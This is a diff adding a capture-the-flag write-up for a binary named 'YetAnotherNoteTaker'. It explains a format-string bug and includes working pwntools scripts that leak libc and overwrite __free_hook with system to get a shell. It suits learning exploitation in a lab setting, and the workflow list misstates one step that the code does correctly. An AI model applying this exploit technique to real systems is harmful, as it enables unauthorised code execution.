@@ -154,3 +154,121 @@ This challenge gave us the audio of ```Brr Brr Patapim``` song from Italian brai
 ### YetAnotherNoteTaker
 ![Notetaker](assets/notetaker.png)
 
+**Binary analysis:**
+
+![Checksec](assets/noteTaker_checksec.png)
+
+The binary has: 
+- ```canary enabled``` meaning program crashes when it encounters stack overflows 
+- ```PIE disabled``` meaning the binary address doesn't change 
+- ```Full RELRO``` indicates ```GOT(Global Offset Table)``` is not writable  
+- ```NX enabled``` indicates the binary is no execute enabled meaning we cannot inject shellcodes 
+
+We are given these libc files:
+![Libs](assets/noteTaker_libs.png)
+
+The binary has format string vulnerability:
+![Vulnerability](assets/noteTaker_formatString.png)
+
+Because ```Full RELRO``` is enabled, we cannot overwrite the Global Offset Table (GOT). However, we can target Libc hooks (```__free_hook```), which are writable pointers within the libc library itself.
+![Free Hook](assets/noteTaker_freehook.png)
+
+#### Workflow
+- Leak Libc address
+- find libc base
+- calculate offset
+- find ```_free_hook``` address
+- calculate ```system``` address which is used to trigger shell by overwriting ```_free_hook``` 
+- overwrite ```_free_hook``` with ```/bin/sh```
+- Trigger shell
+
+**Leak:**
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('./notetaker')
+libc = ELF('./libs/libc.so.6')  
+
+
+p=process('./notetaker')
+
+def write_note(data):
+    p.sendlineafter(b'> ', b'2')
+    p.sendafter(b'note: ', data)
+
+def read_note():
+    p.sendlineafter(b'> ', b'1')
+    return p.recvline()
+
+write_note(b'AAAAAAAA'+b'%p.' * 50 + b'\n')
+leaks = read_note().decode().split('.')
+for i, leak in enumerate(leaks):
+    print(f"Offset {i+1}: {leak}")
+```
+![Leak](assets/noteTaker_leak.png)
+
+***Buffer Offset*** is at index 8. Lets check for the libc and stack in gdb:
+![Libc and Stack](assets/noteTaker_libcnstack.png)
+
+Lets calculate offset:
+![libs Offset](assets/noteTaker_libcOffset.png)
+
+#### Exploit
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('./notetaker')
+libc = ELF('./libs/libc.so.6')
+
+p = process('./notetaker')
+
+def write_note(data):
+    p.sendlineafter(b'> ', b'2')
+    p.sendafter(b'note: ', data)
+
+def read_note():
+    p.sendlineafter(b'> ', b'1')
+    return p.recvline()
+
+def clear_note():
+    p.sendlineafter(b'> ', b'3')
+
+
+#STEP 1: Leak libc
+write_note(b'%1$p\n')
+leak = read_note().strip()
+libc_leak = int(leak, 16)
+log.info(f"Leaked: {hex(libc_leak)}")
+
+LEAK_OFFSET = 0x3c4b28  
+libc.address = libc_leak - LEAK_OFFSET
+log.success(f"Libc base: {hex(libc.address)}")
+
+
+# STEP 2: Calculate addresses
+free_hook = libc.sym['__free_hook']
+system = libc.sym['system']
+log.info(f"__free_hook: {hex(free_hook)}")
+log.info(f"system: {hex(system)}")
+
+
+# STEP 3: Overwrite __free_hook with system
+clear_note()
+BUFFER_OFFSET = 8
+
+payload = fmtstr_payload(BUFFER_OFFSET, {free_hook: system}, write_size='short')
+
+write_note(payload + b'\n')
+read_note() 
+
+
+# STEP 4: Trigger free("/bin/sh") -> system("/bin/sh")
+
+p.sendlineafter(b'> ', b'/bin/sh\x00') 
+p.interactive()
+```
+
+![shell](assets/noteTaker_shell.png)
+
